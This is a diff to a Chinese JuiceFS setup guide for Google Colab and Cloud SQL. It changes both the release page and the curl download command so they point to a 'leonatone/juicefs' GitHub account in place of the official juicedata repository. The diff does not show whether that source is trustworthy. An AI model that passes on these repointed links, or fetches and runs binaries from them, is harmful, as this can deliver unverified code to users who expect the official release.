@@ -48,7 +48,7 @@ cloud_sql_proxy -instances=juicefs-learning:europe-west1:juicefs-sql-example-1=t
 ```
 
 然后使用 `juicefs format` 命令创建一个名为“myvolume”的新文件系统。之后将此文件系统挂载到您可以访问云资源的任何其他机器/实例中。
-你可以在[这里](https://github.com/juicedata/juicefs/releases)下载 JuiceFS。
+你可以在[这里](https://github.com/leonatone/juicefs/releases)下载 JuiceFS。
 
 ```shell
 juicefs format \
@@ -70,7 +70,7 @@ juicefs format \
 1. 下载 `JuiceFS`到 Colab 实例上
 
    ```shell
-   ! curl -L -o juicefs.tar.gz https://github.com/juicedata/juicefs/releases/download/v1.0.0-beta2/juicefs-1.0.0-beta2-linux-amd64.tar.gz
+   ! curl -L -o juicefs.tar.gz https://github.com/leonatone/juicefs/releases/download/v1.0.0-beta2/juicefs-1.0.0-beta2-linux-amd64.tar.gz
    ! tar -xf juicefs.tar.gz
    ```
 
